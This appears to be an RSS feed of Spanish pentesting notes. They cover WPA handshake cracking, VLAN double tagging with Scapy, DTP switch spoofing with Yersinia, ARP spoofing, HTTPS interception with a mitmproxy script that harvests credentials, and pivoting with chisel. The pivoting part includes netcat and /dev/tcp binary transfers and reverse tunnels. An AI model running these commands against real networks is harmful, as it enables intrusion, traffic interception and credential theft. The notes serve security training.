 <br><br>El crackeo del handshake en redes Wi-Fi WPA/WPA2 implica capturar el 4-way handshake entre un cliente y un punto de acceso, y luego intentar descifrar la PSK mediante un ataque de diccionario o fuerza bruta. Este proceso nos permite obtener la contraseña de la red y, por lo tanto, acceso a la misma.<br><br><br><br>Una vez que tengamos el archivo de captura .cap, tendriamos que convertir dicho archivo .cap a .hccap, ya que este archivo es compatible con la herramienta de fuerza bruta johntheripper.<br>aircrack-ng -J {name_file.hccap} {file.cap}
Copy<br>De esta manera tendriamos un nuevo archivo .hccap el cual haciendo uso de la herramienta hccap2john podremos extraer únicamente el hash.<br>hccap2john {name_file.hccap} &gt; {file_to_john}
Copy<br>Ahora, solo quedaria hacer uso de john para realizar un ataque de fuerza bruta al archivo creado. <br>john --wordlist=/path/to/wordlist.txt {file_to_john}
Copy<br><br>Una vez que tengamos el archivo .cap, tendriamos que convertir dicho archivo .cap a .hccapx, formato que la herramienta de fuerza bruta hashcat puede interpretar. Para eso haremos uso de la herramienta hcxpcapngtool.<br>hcxpcapngtool -o hash.hccapx {capture}.cap
Copy<br>Ahora solo queda hacer uso de la herramienta hashcat para relizar un ataque de fuerza bruta al archivo creado.<br>hashcat -m 2500 hash.hccapx /path/to/wordlist.txt
Copy<br><br>Una vez que tengamos el archivo de captura .cap, podriamos realizar un ataque de fuerza bruta a la contraseña encriptada del AP que se encuentra en todo el archivo .cap. <br>aircrack-ng -w /path/to/wordlist.txt {file.cap} 
Copy<br><br><br>Una vez conseguida la contraseña de la red, podriamos conectarnos a la misma para proceder con intentar llevar a cabo el proceso tradicional de cualquier auditoria a los dispositivos de la red, o bien podriamos comenzar a capturar el trafico de la red, desencriptandolo para asi poder ver todo el trafico entero, es decir, páginas visitadas, metodos http, direcciones IP, etc. <br><br>airdecap-ng -p {password} -e {essid} {file.cap}
Copy<br>Tras la ejecución de este comando, en caso de haber introducido correctamente la credencial, todo el tráfico previamente o posteriormente capturado podrá ser desencriptado, pudiendo asi con herramientas como tshark o wireshark, filtrar por diversas peticiones, por ejemplo, solicitudes POST, GET, etc.<br>tshark -r {file-dec.cap} -Y "http.request.method==POST" -Tjson 
tshark -r {file-dec.cap} -Y "http.request.method==POST" -Tfields -e http.file_data 
Copy<br>Filtros más específicos como paquetes con una IP de origen o destino específica.<br>tshark -r {file-dec.cap} -Y "ip.src == 192.168.1.1 || ip.dst == 192.168.1.1"   
Copy<br>Filtrar por puertos.<br>tshark -r {file-dec.cap} -Y "tcp.port == 80"
Copy<br>Mostrar campos específicos.<br>tshark -r {file-dec.cap} -Y -T fields -e ip.src -e ip.dst
Copy<br>Filtrar paquetes ARP, ICMP<br>tshark -r {file-dec.cap} -Y "arp"
tshark -r {file-dec.cap} -Y "icmp"
Copy<br>Filtrar paquetes por porotoclos de aplicación<br>tshark -r {file-dec.cap} -Y "dns"
tshark -r {file-dec.cap} -Y "http" 
tshark -r {file-dec.cap} -Y "tcp" 
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/post-explotation.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/Post Explotation.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 02:07:09 GMT</pubDate></item><item><title><![CDATA[Segmentated Networks]]></title><description><![CDATA[ 
 <br><br>Muchas organizaciones, por lo general la mayoría, intentea mejorar la seguridad de sus redes a través de la implementación de segmentación de redes o estrategias de segregación. Estas estrategias separan activos con menor requerimiento de seguridad, como dispositivos en la red de inivitados, de componentes criticios de la infraestructura de la empresa, como los servidores web localizados en un datacenter y la red para telefonos celulares de los empleados.<br><br><br>Una VLAN es una red lógica que agrupa un conjunto de dispositivos en una o más redes físicas, separando el tráfico de red en diferentes segmentos para mejorar la seguridad y la eficiencia de la misma, estas permiten que dispositivos que están físciamente en la misma red, pero lógicamente separados, no puedan comunicarse directamente sin pasar por un router o firewall. <br>Para que dispositivos en diferentes VLANs se comuniquen, el tráfico debe pasar por un dispositivo de Capa 3 (Network) del <a data-href="Modelo OSI - OSI Model" href="https://dobliuw.com/Modelo OSI - OSI Model" class="internal-link" target="_self" rel="noopener nofollow">Modelo OSI - OSI Model</a>, como podría ser un router o switch. Estos dispositivos serán capaces de entender y enrutar tráfico entre distintas subredes, así como también podrán aplicar ACLs (Access Control LIsts), que son reglas que determinarán si un paquete de datos puede pasar o debe ser bloqueado.<br>En relación a IoT, estas pueden segmentar dispositivos sensibles, aislando el tráfico para evitar accesos no autorizados.<br>Si las VLANs están configuradas de forma insegura o si se utilizan protocolos de red vulnerables, un atacante podría aprovechar estas debilidades para realizar un ataque de VLAN-Hopping. Este tipo de ataque permite que el atacante acceda a tráfico de una VLAN diferente a la que originalmente tiene acceso, eludiendo las segmentaciones de seguridad.<br><img alt="common_vlan_network.png" src="https://dobliuw.com/lib/media/common_vlan_network.png" style="width: 1200px; max-width: 100%;"><br><br>Los Access Ports se utilizan para conectar endpoints como computadoras, impresoras, cámaras IP, etc. a la red, cada uno de estos está configurado para pertenecer a una única VLAN. Esto sginifica que cualquier dispositivo conectado a este puerto se considera parte de esa VLAN específica.<br>Cuando un dispositivo envía tráfico a través de un Accesso Port, el swtich no añade etiquetas VLAN a los paquetes porque ya asume que pertenecen a la VLAN a la que está asignado el puerto. El etiqeutado solo se aplica cuando el tráfico se envía a través de un Trunk Port.<br><br>Por otro lado, los Trunk Ports se utilizan para transportar tráfico de múltiples VLANs entre swtiches o entre un switch y un router, a diferencia de los access ports, estos permiten que el tráfico de varias VLANs pasen por el mismo puerto.<br>En un Trunk Port, los paquetes se etiquetan con un VLAN tag que contiene el VLAN ID. Este etiquetado es lo que permite que el tráfico de diferentes VLANs se distinga y sea enrutado correctamente al llegar al sw tich o router de destino.<br>Cuando el tráfico etiquetado llega a su destino final en la red (A través de un Acces Port), el switch o router elimina la etiqueta VLAN antes de entragar el tráfico al dispositivo conectado.<br><br>Cuando el tráfico necesita pasar entre switches, esto se realiza a través de un trunk link, donde el switch añade un VLAN tag al pquete que incluye el VLAN ID. Este proceso se conoce como VLAN Tagging, una vez que el tráfico llega al switch de destino, el VLAN tag es eliminado y el tráfico se dirige a los puertos correctos basados en la VLAN original a la que pertenece el paquete.<br><br>Como vimos en la imagen de arriba, si un dispositvo (Ejemplo, Guest laptop de la Room A) envía un paquete, ese paquete solo puede ser enviado a otros dispositiovs en la VLAN a la que pertenece este (Ejemplo, VLAN 10), ya sea dentro del mismo switch o a través de un trunk link a otro switch.<br>Por otro lado, para que el tráfico pueda moverse entre diferentes VLANs, el tráfico debe pasar a través de un dispositivo de capa 3 (Como un router o un switch de capa 3) que tenga reglas configuradas para permitir o denegar dicho tráfico.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/1.-segmentated-networks-attacks/vlans-(virtual-local-area-networks)/0.-vlans.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/1. Segmentated Networks attacks/VLANs - (Virtual Local Area Networks)/0. VLANs.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Aug 2024 00:59:52 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/common_vlan_network.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/common_vlan_network.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Double Tagging]]></title><description><![CDATA[ 
 <br><br>El ataque de Double Tagging es una técnica de ataque en redes VLANs que explota una vulnerabilidad en la forma en que algunos swtiches manejan las etiquetas VLAN en tramas Ethernet. Este ataque permite a un atacante enviar tráfico no autorizado desde una VLAN a otra, lo que puede llevar a una violación de la segmentación de red y potencialmente a la exfiltración de datos o ataques más avanzados.<br>Como vimos en <a data-href="0. VLANs#Trunk Ports" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/1.-segmentated-networks-attacks/vlans-(virtual-local-area-networks)/0.-vlans.html#Trunk_Ports" class="internal-link" target="_self" rel="noopener nofollow">0. VLANs &gt; Trunk Ports</a>, los Trunk Ports son puertos de un switch que pueden transportar tráfico de múltiple VLANS, siendo este etiquetado con el ID de la VLAN a la que pertenece el mismo.<br>Por otro lado, también hemos mencionado el proceso de VLAN Tagging  (<a data-href="0. VLANs#Trunk Links &amp; VLAN Tagging" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/1.-segmentated-networks-attacks/vlans-(virtual-local-area-networks)/0.-vlans.html#Trunk_Links_&amp;_VLAN_Tagging" class="internal-link" target="_self" rel="noopener nofollow">0. VLANs &gt; Trunk Links &amp; VLAN Tagging</a>), el cual se basa en el proceso de agregar una etiqueta/tag que incluye la VLAN ID al tráfico que pasa por un Trunk Port. Este proceso se maneja comúnmente meidante el protocolo IEEE 802.1Q. <br><br><br>El atacante crea una trama Ethernet con dos etiquetas VLANS, una externa (La primera) y otra interna (La segunda). La primera etiqueta, ejemplo VALN 1 corresponde a la VLAN a la que está conectado el atacante, mientras que la segunda etiqueta, ejemplo VLAN 20 corresponde a la VLAN objetivo que quiere acceder.<br>El switch que recibe el paquete Double Tagged en un puerto de acceso, elimina la primera etiqueta (VLAN 1) porque asume que el mismo pertenece a su VLAN nativa. Ahora, el paquete, que aún contiene la segunda etiqeuta (VALN 20), se reenvía al puerto trunk conectado a otros switches.<br>Cuando el paquete llega a otro switch a través del trunk link, se trata como si perteneciera a la VLAN interna (VLAN 20) debido a la etiqueta restante. El switch entonces entrega la trama a la VLAN 20, permitiendo que el atacante envíe tráfico hacia una VLAN a la que no debería tener acceso.<br><img alt="double_tagging_attack_example.png" src="https://dobliuw.com/lib/media/double_tagging_attack_example.png"><br>Para llevar a cabo este tipo de ataques, podríamos hacer uso del framework <a data-tooltip-position="top" aria-label="https://scapy.net" rel="noopener nofollow" class="external-link" href="https://scapy.net" target="_blank">Scapy</a> para programar herramientas de manipulación de paquetes en Python.<br>
<br>Instalr Scapy:
<br>pip install scapy
Copy<br>
<br>Código de Python con Scapy que emite una traza ICMP a un dispositivo víctima con la IPv4 192.168.1.20 localizado en la VLAN 20. Lógicamente etiquetando el paquete con 2 VLAN ID's, 1 y 20.
<br>from scapy.all import *

packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.20')/ICMP()
sendp(packet)
Copy<br>La función Ether() crea un capa de link auto generada. Luego utilizando la función Dot1Q() creamos tos VLAN Tags. Con la función IP() definimos una capa de red customizada para routear el paquete al dispositivo víctima. Finalmente, agregamos un payload auto generado que contiene la capa de transporte que queremos usar (Por ejemplo ICMP). <br>Es importante tener en cuenta que la respuesta ICMP nunca llegará a nuestro dispositivo de atacante, pero podriamos verificar que el ataque tuvo éxito observando los paquetes de red en la VLAN de la víctima mediante herramientas como Wireshark o Tshark. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/1.-segmentated-networks-attacks/vlans-(virtual-local-area-networks)/double-tagging.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/1. Segmentated Networks attacks/VLANs - (Virtual Local Area Networks)/Double Tagging.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Aug 2024 01:17:04 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/double_tagging_attack_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/double_tagging_attack_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Switch Spoofing]]></title><description><![CDATA[ 
 <br><br>Muchos switches de red establecen tunk links de VLANs dinámicamente usando un Cisco proprietary netwroking protocol llamado Dynamic Trunking Protocol (DTP). DTP permite a dos swtiches conectados crear un trunk link y luego negociar la VLAN usando el método tagging mencionado en <a data-href="0. VLANs#Trunk Links &amp; VLAN Tagging" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/1.-segmentated-networks-attacks/vlans-(virtual-local-area-networks)/0.-vlans.html#Trunk_Links_&amp;_VLAN_Tagging" class="internal-link" target="_self" rel="noopener nofollow">0. VLANs &gt; Trunk Links &amp; VLAN Tagging</a>. <br>El ataque Switch Spoofing consiste en que el atacante abuse del protocolo DTP fingiendo que su dispositivo es un switch de la red, logrando así que su dispositivo genere un trunk link con un switch légitimo de la red. Como resultado, el atacante gana acceso a los paquetes provenientes de cualquier VLAN con la cual el switch légitimo interactuase.<br><br><br><a data-tooltip-position="top" aria-label="https://github.com/tomac/yersinia" rel="noopener nofollow" class="external-link" href="https://github.com/tomac/yersinia" target="_blank">Yersinia</a> es una herramiente ade código abierto diseñada para realizar pentesting y explotar  vulnerabilidades de nprotocolos de red en la capa de enlace de datos (Capa 2 del <a data-href="Modelo OSI - OSI Model" href="https://dobliuw.com/Modelo OSI - OSI Model" class="internal-link" target="_self" rel="noopener nofollow">Modelo OSI - OSI Model</a>). Es muy útil para probar la seguridad de redes basadas en tecnologías como VLANs, Spanning Tree Protocol (STP), Dynamic Trunking Protocol (DTP), etc.<br>Si estamos usando Kali Linux esta herramienta ya viene pre-instalada, pero previamente necesitaremos instalar el paquete kali-linux-large:<br>sudo apt instal kali-linux-large
Copy<br>Este enfoque es el recomendado en lugar de compilar las herramientas manualmente, pero si quisieramos podríamos intentar compilar manulamente Yersinia de la siguiente manera:<br>sudo su
apt-get install libnet1-dev libgtk2.0-dev libpcap-dev
tar xvfz yernisia-0.8.2.tar.gz &amp;&amp; cd yersinia-0.8.2 &amp;&amp; ./autogen.sh
./configure
make &amp;&amp; make install 
Copy<br>Para establecer el trunk link con el dispositivo del atacante, necesitaremos abrir la interfaz gráfica de Yersinia:<br>yersinia -G
Copy<br>Una vez en la interfaz, clickearemos donde dice Launch Attack y posteriormente en la pestaña de DTP seleccionaremos la opción de Enable trunking. <br><img alt="yersinia_dtp_tab.png" src="https://dobliuw.com/lib/media/yersinia_dtp_tab.png"><br>Cuando seleccionemos esta opción, Yersinia comenzará a imitar a un swtich que admita el protocolo FTP, conectarse al pueto de un switch víctima y enviar repetidamente los paquetes DTP necesarios para establecer un trunk link con el swtich víctima. <br>Una vez que se haya realizado el trunk link deberíamos ver en la pestaña 802.1Q los datos de las VLANs disponibles.<br><img alt="802.1Q_yersinia_tab_example.png" src="https://dobliuw.com/lib/media/802.1q_yersinia_tab_example.png" style="width: 900px; max-width: 100%;"><br>Los datos además incluyen las VLAN IDs disponibles. Para acceder a los paquetes de una vLAN, primero deberemos identificar nuestra interfaz de red con el comando nmcli:<br>nmcli
# eth0: connected to Wired connection 1
#        "Intel 82545EM"
#        ethernet (e1000), 00:0C:29:89:BB:DE, hw, mtu 1500
Copy<br>En este ejemplo, el dispositivo del atacante utiliza la interfaz de red eth0, por lo que ingresaremos los sigueintes comandos:<br>sudo modprobe 8021q
sudo vconfig add eth0 20
sudo ifconfig eth0.20 192.168.1.2 netmask 255.255.255.0 up
Copy<br>Con el comando sudo modprobe 8021q estamos cargando el modulo del kernel para el método de VLAN Tagging. Por otro lado, estamos creando una nueva interfaz de red con la VLAN ID deseada usando el comando sudo vconfig add {netowrk_interface} {desired_VLAN_ID}. Finalmente con el comando sudo ifconfig {network_interface}.{sub_interface(VLAN_ID)} {IP_Address} netmask {netmask} up estamos habilitando la interfaz de red luego de haberla configurado asignandole una dirección IP con la cual nos comunicaremos a la VLAN 20, previamente configurada, por ejemplo con eth0.20, donde indicamos que la interfaz de red física es eth0 pero la subinterfaz es la 20, así como su correspondiente netmask respectiva a la IP asignada. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/1.-segmentated-networks-attacks/vlans-(virtual-local-area-networks)/switch-spoofing.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/1. Segmentated Networks attacks/VLANs - (Virtual Local Area Networks)/Switch Spoofing.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Aug 2024 00:46:54 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/yersinia_dtp_tab.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/yersinia_dtp_tab.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[ARP Spoofing | Envenenamiento ARP]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a> <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> 
<br><br><br>El ARP Spoofing es una técninca de ataque en redes donde un tacante envía mensajes ARP falsificados en una red local. Esto se hace para asociar la dirección MAC del atacante con la dirección IP de otro dispositivo, como un servidor o un gateway, lo que permite al atacante interceptar el tráfico entre dos sistemas.<br>El concepto de Man-In-The-Middle (MITM) es crucial en esta técnica, ya que el atacante se posiciona estratégicamente entre dos partes para interceptar o modificar el tráfico de datos, una táctica común en ataques cibernéticos. Esta técnica es posible debido a la naturaleza de confianza del protocolo ARP, que no verifica si las respuestas sa las solicitudes ARP son legítimas.<br>
<br>Ejempo de conexión normal en una LAN:
<br><img alt="lan_connection_arp.png" src="https://dobliuw.com/lib/media/lan_connection_arp.png"><br>
<br>Ejemplo de una conexión con ARP Spoofing en una LAN:
<br><img alt="arp_spoofing_example.png" src="https://dobliuw.com/lib/media/arp_spoofing_example.png"><br><br><br>Para llevar acabo este ataque lo primero que deberíamos realizar es ciertos cambios a nivel de sistema, como a nivel de Firewall, cambiando las politicas para el FORWARD.<br>
<br>En caso de usar iptables:
<br>sudo iptables --policy FORWARD ACCEPT
Copy<br>Por otro lado, cambiar el valor del archivo /proc/sys/net/ipv4/ip_forward a 1:<br>sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward
Copy<br>Con estas configuraciones realizadas, estaríamos con la posibilidad de comenzar a envenenar la red para cambiar el valor de las tablas arp (arp -a) del gateway como de la máquina victima. Para ello podríamos hacer uso de herramientas como arpspoof o crearnos nuestro propio envenenador en legunajes como python y librerías como Scapy. <br>arpspoof -i {network_interface} -r {gateway_ip} -t {target_ip}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/arp-spoof-envenenamiento-arp.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/ARP Spoof - Envenenamiento ARP.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 25 Oct 2024 14:15:28 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/lan_connection_arp.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/lan_connection_arp.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[HTTPS Sniffing - SSL/TLS Stripping]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> 
<br><br><br>El HTTPS Sniffing, también conocido como SSL/TLS Stripping, es una técnica utilizada por atacantes para interceptar el tráfico cifrado HTTPS entre un usuario y un servidor. Aunque el protocolo HTTPS está diseñado para proporcionar una capa de seguridad adicional mediante la encriptación de la comunicación entre el navegador y el servidor, el HTTPS Sniffing intenta debilitar esta seguridad.<br><br><br>El desafío con el tráfico HTTPS, que está cifrado para proteger la privacidad y seguridad de los datos ,qes que no se puede leer directamente. Aquí es donde entra en juego la instalación de un certificado en la máquina víctima. Al hacer esto, engañamos al dispositivo para que confíe en un determinado destino (Un proxy nuestro), lo que nos permitirá descifrar y acceder al contenido del tráfico HTTPS. De más está decir que para esto necesitaríamos tener acceso a la máquina víctima, sea por una previa explotación para espíar el tráfico posteriormente. <br>Con herramientas como mitmdump podremos llevar a cabo este ataque, dado que es una herrmienta que actúa como un proxy, permitiéndonos interceptar, modificar y analizar el tráfico entre un cliente y un servidor. <br>Una vez instalado mitmdump, tendremos tres binarios: <br>
<br>mitmdump
<br>mitmproxy
<br>mitmweb
<br>En este caso, dejaremos corriendo el mitmweb, el cual nos habilitara el servidor proxy por el puerto 8080, posteriormente deberemos configurar el proxy en la máquina víctima, en caso de ser una máquina Windows, podríamos hacerlo desde una terminal como el usuario administrador con las siguientes líneas: <br># Enable Proxy True
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
# Configurate your proxy server
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.1.41:8080" /f
Copy<br>Con el binario mitmproxy, se nos desplegará una interfaz grafica en donde podremos ver todas las peticiones y desplegar la información de las mismas que realize la máquina vícitma, pero deberíamos proceder a configurar el certificado, de lo contrario todas las búsquedas web que realize el usuario se verán con una alerta de seguridad.<br>Otra opción es crear scripts propios y hacer uso de mitmdump para vincularlos:<br>Script propio en Python:<br>#!/usr/bin/env python3 
from mitmproxy import http
from urllib.parse import urlparse

urls_visiteds = set()
sensible_words = ["login", "user", "pass", "username", "password", "admin", "name", "uname", "pwd", "email", "mail", "correo", "urname"]

def is_sensible(data):
    return any(word in data for word in sensible_words)


def request(packet):
    url = packet.request.url
    url = urlparse(url)
    protocol = url.scheme
    domain = url.netloc
    path = url.path
    data = packet.request.get_text()


    url_to_show = f"{protocol}://{domain}{path}"

    if url_to_show not in urls_visiteds:
        urls_visiteds.add(url_to_show)
        print(f"\n[+] URL Visited: {url_to_show}\n")

    if is_sensible(data):
        print("\n\n\t[!] Possible sensible data:\n")
        print(data)
Copy<br>Para vincular este scrip, deberíamos ejecutar el comando:<br>./mitmdump -s script.py --quiet
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/https-sniffing-ssl-stripping.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/HTTPS Sniffing - SSL Stripping.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 19 Jan 2024 17:46:23 GMT</pubDate></item><item><title><![CDATA[¿ Que es el <strong>pivoting</strong> ?]]></title><description><![CDATA[ 
 <br><br>El pivoting (También conocido como "hopping") es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.<br>Por ejemplo, si un atacante ha comprometido una máquina en una red corporativa, puede utilizar técnicas de pivoting para utilizar esa máquina como punto de salto para atacar otras máquinas en la misma red que de otra manera no serían accesibles. Esto se logra a través de la creación de túneles de comunicación desde la máquina comprometida a otras máquinas en la red.<br>El pivoting puede ser utilizado para superar restricciones de seguridad que de otra manera impedirían a un atacante acceder a determinadas máquinas o redes. Por ejemplo, si una red corporativa utiliza segmentación de red para separara diferentes partes de la red, el pivoting puede ser utilizado para superar esta restricción y permitir que un atacante salte de una red a otra. <br><br><br>Como sabemos el pivoting consiste en movernos desde una máquina a otra, pudiendo así llegar a tener conexión con máquinas las cuales previamente no contabamos con traza, esto se puede hacer de múltiples formas, pero una herramienta muy utilizada para el pivoting es <a data-tooltip-position="top" aria-label="'https://github.com/jpillora/chisel/releases'" rel="noopener nofollow" class="external-link" href="https://dobliuw.com/'https://github.com/jpillora/chisel/releases'" target="_blank">chisel</a>, la cual hay que correr desde la máquina atacante como server y desde la/s máquina/s victima/s como client. <br><br>git clone https://github.com/jpillora/chisel
cd chisel

go build -ldflags "-s -w" .
upx chisel
Copy<br><br>En este caso para descargar Chisel a una máquina Windows, en el apartado de Releases descargamos la versión que necesitemos, por ejemplo chisel_1.7.7_windows_amd64.gz.<br>Una vez que tengamos chisel en nuestra máquina, si deseamos hacer pivoting entre la Máquina 1 con la Máquina 2 para llegar a una Máquina 3, deberiamos trasladar el chisel a nuestra Máquina 2, para eso existen varías maneras (Ignorando el descargarlo desde google)<br>Con python: <br># Máquina 1 en donde este el {binary}: 
python3 -m http.server {port}
# Máquina 2: 
wget http://{ip}:{port}/{binary}
Copy<br>Si tenemos ssh configurado con un authorized_keys en la máquina: <br>scp {binary} {user}@{ip}:/{path}
Copy<br>Con netcat: <br># Máquina 1: 
nc -nvlp {port} &lt; {binary}
# Máquina 2: 
cat &lt; /dev/tcp/{ip}/{port} &gt; {name_binary}
Copy<br>Con base64:<br># Máquina 1:
base64 -w 0 {file} | xclip -sel clip
# Máquina 2: 
echo '{base64_string}' | base64 -d &gt; {binary_name}
Copy<br>Una vez que tengamos chisel en la Máquina 2 que tiene conexión con la Máquina 3 con la cual nuestra Máquina 1 no tiene conexión, en nuestra máquina de atacante (La Máquina 1) deberíamos crear el server de chisel: <br>./chisel server --reverse -p 1234
Copy<br>Mientras que si quisieramos compartir un puerto especifico de la Máquina 3 desde la Máquina 2 para poder acceder desde la Máquina 1, podríamos ejecutar:<br># Desde nuestra Máquina 2 conectarnos a nuestro server de chisel haciend port forwarding de un puerto de la máquina 3 a nuestra máquina por el puerto 8899
./chisel client {IP_atacante}:1234 R:8899:{Máquina3_IP}:{Máquina3_port}
Copy<br>Al ejecutar el comando de arriba,  si bien no tenemos conexión con la Máquina 3, la Máquina 2 se esta conectando a nuestro servidor de chisel brindando la disponibilidad de un puerto seleccionado de la Máquina 3 y permitiendonos acceder a este en un puerto seleccionado (Ej: 8899)<br>Pero también podemos permitir acceso a todos los puertos para no tener que jugar puerto por puerto, de manera que si lo que nos interesa es tener completa conexión con la Máquina 3 desde la Máquina 1, en la Máquina 2 podríamos ejecutar el siguiente comando: <br>./chisel client {IP_atacante}:1234 R:8899:socks
Copy<br>De esta manera, por el puerto indicado (8899, si no especificamos 'R:socks' se habré por defecto el 1080) tendríamos conexión desde la Máquina 1 a la Máquina 3 pasando por este tunel. <br><br>./chisel client {IP_atacante}:1234 R:socks R:443:{Máquina3_IP}:443/udp
Copy<br>Pero una vez creado el tunel, tenemos que agregar este en el archivo /etc/proxychains4.conf, al tratarse de un único tunel descomentamos la línea que dice strict_chain y al final de todo agregamos la línea "socks5 127.0.0.1 8899" para indicar que cuando usemos la herramienta proxychains y esta leea del archivo de configuración, entienda que tiene que pasar por el tunel levantado en nuestro localhost por el puerto indicado (Ej. 8899)<br>Por ende, si desde nuestra Máquina 1 (Atacante) indicamos un escaneo a la máquina 3, no podremos, pero jugando con proxychains esta herramienta leera del archivo  /etc/proxychains4.conf donde configuramos un socks5 en nuestro localhost por el puerto indicado. <br># No encontrara el host
nmap -p- --min-rate 5000 -vvv -Pn -n {Máquina3_IP}
# Encontrara el host 
proxychains nmap -Pn -sT -p- --min-rate 5000 -vvv -n {Máquina3_IP}
Copy<br><br>Si queremos que el escaneo con nmap vaya más rapido, podríamos usar el siguiente comando:<br>seq 1 65535 | xargs -P 500 -I {} proxychains nmap -Pn -sT -p{} -T5 -n -v --open {Máquina3_IP} 2&gt;&amp;1 | grep "tcp open"
Copy<br>A partir de aquí, todo es necesario que pase por el proxychain, ejemplos: <br># No encontrara el host
whatweb http://{Máquina3_IP}
# Encontrara el host
proxychains whatweb http://{Máquina3_IP}

# No encontrara el host 
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://{Máquina3_IP} -r -t 20 -x php,txt,html,js,py
# Encontrara el host PERO ira bastante lento
proxychains gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://{Máquina3_IP} -r -t 20 -x php,txt,html,js,py
# Encontrara el host y sera más OPTIMO 
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://{Máquina3_IP} -r -t 20 -x php,txt,html,js,py --proxy socks5://127.0.0.1:8899
